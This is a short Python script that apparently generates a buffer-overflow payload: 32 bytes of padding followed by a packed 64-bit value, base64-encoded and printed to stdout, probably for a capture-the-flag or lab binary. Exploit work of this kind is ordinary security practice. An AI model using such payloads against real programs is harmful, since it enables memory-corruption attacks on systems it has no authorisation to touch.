
import sys
import struct
import base64

buf = b'gggggggggggggggggggggggggggggggg'
buf += struct.pack('<Q', 10346757052704028347)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
